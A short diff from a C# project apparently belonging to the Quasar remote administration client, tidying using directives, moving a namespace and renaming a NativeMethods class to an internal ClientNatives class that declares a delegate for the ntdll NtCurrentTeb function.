@@ -1,16 +1,10 @@
-﻿using Microsoft.Win32.SafeHandles;
-using Quasar.Client.Utilities;
+﻿using Quasar.Client.Win32PE.Structs;
 using System;
-using System.Collections.Generic;
-using System.Globalization;
-using System.Linq;
-using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
-using System.Text;
 
-namespace Quasar.Client.Win32PE.Structs
+namespace Quasar.Client.Utilities
 {
-    public static partial class NativeMethods
+    internal static partial class ClientNatives
     {
         //[DllImport("ntdll.dll")]
         internal delegate IntPtr NtCurrentTebProc();
